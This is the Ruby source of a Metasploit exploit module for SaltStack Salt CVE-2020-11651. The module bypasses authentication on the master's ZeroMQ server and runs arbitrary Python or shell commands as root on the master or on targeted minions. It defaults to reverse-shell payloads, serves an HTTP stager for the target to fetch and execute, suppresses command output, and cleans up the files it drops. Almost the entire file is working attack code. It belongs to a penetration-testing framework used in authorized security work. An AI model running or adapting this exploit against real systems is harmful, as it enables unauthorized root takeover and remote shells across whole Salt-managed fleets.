# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote

  Rank = GreatRanking

  include Msf::Exploit::Remote::ZeroMQ
  include Msf::Exploit::Remote::CheckModule
  include Msf::Exploit::CmdStager::HTTP # HACK: This is a mixin of a mixin
  include Msf::Exploit::FileDropper

  def initialize(info = {})
    super(
      update_info(
        info,
        &#039;Name&#039; => &#039;SaltStack Salt Master/Minion Unauthenticated RCE&#039;,
        &#039;Description&#039; => %q{
          This module exploits unauthenticated access to the runner() and
          _send_pub() methods in the SaltStack Salt master&#039;s ZeroMQ request
          server, for versions 2019.2.3 and earlier and 3000.1 and earlier, to
          execute code as root on either the master or on select minions.

          VMware vRealize Operations Manager versions 7.5.0 through 8.1.0 are
          known to be affected by the Salt vulnerabilities.

          Tested against SaltStack Salt 2019.2.3 and 3000.1 on Ubuntu 18.04, as
          well as Vulhub&#039;s Docker image.
        },
        &#039;Author&#039; => [
          &#039;F-Secure&#039;, # Discovery
          &#039;wvu&#039; # Module
        ],
        &#039;References&#039; => [
          [&#039;CVE&#039;, &#039;2020-11651&#039;], # Auth bypass (used by this module)
          [&#039;CVE&#039;, &#039;2020-11652&#039;], # Authed directory traversals (not used here)
          [&#039;URL&#039;, &#039;https://labs.f-secure.com/advisories/saltstack-authorization-bypass&#039;],
          [&#039;URL&#039;, &#039;https://community.saltstack.com/blog/critical-vulnerabilities-update-cve-2020-11651-and-cve-2020-11652/&#039;],
          [&#039;URL&#039;, &#039;https://www.vmware.com/security/advisories/VMSA-2020-0009.html&#039;],
          [&#039;URL&#039;, &#039;https://github.com/saltstack/salt/blob/master/tests/integration/master/test_clear_funcs.py&#039;]
        ],
        &#039;DisclosureDate&#039; => &#039;2020-04-30&#039;, # F-Secure advisory
        &#039;License&#039; => MSF_LICENSE,
        &#039;Platform&#039; => [&#039;python&#039;, &#039;unix&#039;],
        &#039;Arch&#039; => [ARCH_PYTHON, ARCH_CMD],
        &#039;Privileged&#039; => true,
        &#039;Targets&#039; => [
          [
            &#039;Master (Python payload)&#039;,
            &#039;Description&#039; => &#039;Executing Python payload on the master&#039;,
            &#039;Type&#039; => :python,
            &#039;DefaultOptions&#039; => {
            }
          ],
          [
            &#039;Master (Unix command)&#039;,
            &#039;Description&#039; => &#039;Executing Unix command on the master&#039;,
            &#039;Type&#039; => :unix_command,
            &#039;DefaultOptions&#039; => {
              &#039;PAYLOAD&#039; => &#039;cmd/unix/reverse_python_ssl&#039;
            }
          ],
          [
            &#039;Minions (Python payload)&#039;,
            &#039;Description&#039; => &#039;Executing Python payload on the minions&#039;,
            &#039;Type&#039; => :python,
            &#039;DefaultOptions&#039; => {
            }
          ],
          [
            &#039;Minions (Unix command)&#039;,
            &#039;Description&#039; => &#039;Executing Unix command on the minions&#039;,
            &#039;Type&#039; => :unix_command,
            &#039;DefaultOptions&#039; => {
              # cmd/unix/reverse_python_ssl crashes in this target
              &#039;PAYLOAD&#039; => &#039;cmd/unix/reverse_python&#039;
            }
          ]
        ],
        &#039;DefaultTarget&#039; => 0, # Defaults to master for safety
        &#039;DefaultOptions&#039; => {
          &#039;CheckModule&#039; => &#039;auxiliary/gather/saltstack_salt_root_key&#039;
        },
        &#039;Notes&#039; => {
          &#039;Stability&#039; => [SERVICE_RESOURCE_LOSS], # May hang up the service
          &#039;Reliability&#039; => [REPEATABLE_SESSION],
          &#039;SideEffects&#039; => [IOC_IN_LOGS, ARTIFACTS_ON_DISK]
        }
      )
    )

    register_options([
      Opt::RPORT(4506),
      OptRegexp.new(&#039;MINIONS&#039;, [true, &#039;PCRE regex of minions to target&#039;, /.*/])
    ])

    register_advanced_options([
      OptInt.new(&#039;WfsDelay&#039;, [true, &#039;Seconds to wait for *all* sessions&#039;, 10])
    ])

    # XXX: https://github.com/rapid7/metasploit-framework/issues/12963
    import_target_defaults
  end

  # NOTE: check is provided by auxiliary/gather/saltstack_salt_root_key

  def exploit
    # check.reason is from auxiliary/gather/saltstack_salt_root_key
    if target.name.start_with?(&#039;Master&#039;)
      unless (root_key = check.reason)
        fail_with(Failure::BadConfig,
                  "#{target[&#039;Description&#039;]} requires a root key")
      end

      print_good("Successfully obtained root key: #{root_key}")
    end

    # These are from Msf::Exploit::Remote::ZeroMQ
    zmq_connect
    zmq_negotiate

    print_status("#{target[&#039;Description&#039;]}: #{datastore[&#039;PAYLOAD&#039;]}")

    case target.name
    when /^Master/
      yeet_runner(root_key)
    when /^Minions/
      yeet_send_pub
    end

    # HACK: Hijack WfsDelay to wait for _all_ sessions, not just the first one
    sleep(wfs_delay)
  rescue EOFError, Rex::ConnectionError => e
    print_error("#{e.class}: #{e.message}")
  ensure
    # This is from Msf::Exploit::Remote::ZeroMQ
    zmq_disconnect
  end

  def yeet_runner(root_key)
    print_status("Yeeting runner() at #{peer}")

    # https://github.com/saltstack/salt/blob/v2019.2.3/salt/master.py#L1898-L1951
    # https://github.com/saltstack/salt/blob/v3000.1/salt/master.py#L1898-L1951
    runner = {
      &#039;cmd&#039; => &#039;runner&#039;,
      # https://docs.saltstack.com/en/master/ref/runners/all/salt.runners.salt.html#salt.runners.salt.cmd
      &#039;fun&#039; => &#039;salt.cmd&#039;,
      &#039;kwarg&#039; => {
        &#039;hide_output&#039; => true,
        &#039;ignore_retcode&#039; => true,
        &#039;output_loglevel&#039; => &#039;quiet&#039;
      },
      &#039;user&#039; => &#039;root&#039;, # This is NOT the Unix user!
      &#039;key&#039; => root_key # No JID needed, only the root key!
    }

    case target[&#039;Type&#039;]
    when :python
      vprint_status("Executing Python code: #{payload.encoded}")

      # https://docs.saltstack.com/en/master/ref/modules/all/salt.modules.cmdmod.html#salt.modules.cmdmod.exec_code
      runner[&#039;kwarg&#039;].merge!(
        &#039;fun&#039; => &#039;cmd.exec_code&#039;,
        &#039;lang&#039; => payload.arch.first,
        &#039;code&#039; => payload.encoded
      )
    when :unix_command
      # HTTPS doesn&#039;t appear to be supported by the server :(
      print_status("Serving intermediate stager over HTTP: #{start_service}")

      vprint_status("Executing Unix command: #{payload.encoded}")

      # https://docs.saltstack.com/en/master/ref/modules/all/salt.modules.cmdmod.html#salt.modules.cmdmod.script
      runner[&#039;kwarg&#039;].merge!(
        # cmd.run doesn&#039;t work due to a missing argument error, so we use this
        &#039;fun&#039; => &#039;cmd.script&#039;,
        &#039;source&#039; => get_uri,
        &#039;stdin&#039; => payload.encoded
      )
    end

    vprint_status("Unserialized clear load: #{runner}")
    zmq_send_message(serialize_clear_load(runner))

    unless (res = sock.get_once)
      fail_with(Failure::Unknown, &#039;Did not receive runner() response&#039;)
    end

    vprint_good("Received runner() response: #{res.inspect}")
  end

  def yeet_send_pub
    print_status("Yeeting _send_pub() at #{peer}")

    # NOTE: A unique JID (job ID) is needed for every published job
    jid = generate_jid

    # https://github.com/saltstack/salt/blob/v2019.2.3/salt/master.py#L2043-L2151
    # https://github.com/saltstack/salt/blob/v3000.1/salt/master.py#L2043-L2151
    send_pub = {
      &#039;cmd&#039; => &#039;_send_pub&#039;,
      &#039;kwargs&#039; => {
        &#039;bg&#039; => true,
        &#039;hide_output&#039; => true,
        &#039;ignore_retcode&#039; => true,
        &#039;output_loglevel&#039; => &#039;quiet&#039;,
        &#039;show_jid&#039; => false,
        &#039;show_timeout&#039; => false
      },
      &#039;user&#039; => &#039;root&#039;, # This is NOT the Unix user!
      &#039;tgt&#039; => datastore[&#039;MINIONS&#039;].source,
      &#039;tgt_type&#039; => &#039;pcre&#039;,
      &#039;jid&#039; => jid
    }

    case target[&#039;Type&#039;]
    when :python
      vprint_status("Executing Python code: #{payload.encoded}")

      # https://docs.saltstack.com/en/master/ref/modules/all/salt.modules.cmdmod.html#salt.modules.cmdmod.exec_code
      send_pub.merge!(
        &#039;fun&#039; => &#039;cmd.exec_code&#039;,
        &#039;arg&#039; => [payload.arch.first, payload.encoded]
      )
    when :unix_command
      vprint_status("Executing Unix command: #{payload.encoded}")

      # https://docs.saltstack.com/en/master/ref/modules/all/salt.modules.cmdmod.html#salt.modules.cmdmod.run
      send_pub.merge!(
        &#039;fun&#039; => &#039;cmd.run&#039;,
        &#039;arg&#039; => [payload.encoded]
      )
    end

    vprint_status("Unserialized clear load: #{send_pub}")
    zmq_send_message(serialize_clear_load(send_pub))

    unless (res = sock.get_once)
      fail_with(Failure::Unknown, &#039;Did not receive _send_pub() response&#039;)
    end

    vprint_good("Received _send_pub() response: #{res.inspect}")

    # NOTE: This path will likely change between platforms and distros
    register_file_for_cleanup("/var/cache/salt/minion/proc/#{jid}")
  end

  # https://github.com/saltstack/salt/blob/v2019.2.3/salt/utils/jid.py
  # https://github.com/saltstack/salt/blob/v3000.1/salt/utils/jid.py
  def generate_jid
    DateTime.now.new_offset.strftime(&#039;%Y%m%d%H%M%S%6N&#039;)
  end

  # HACK: Stub out the command stager used by Msf::Exploit::CmdStager::HTTP
  def stager_instance
    nil
  end

  # HACK: Sub out the executable used by Msf::Exploit::CmdStager::HTTP
  def exe
    # NOTE: The shebang line is necessary in this case!
    <<~SHELL
      #!/bin/sh
      /bin/sh
    SHELL
  end

end

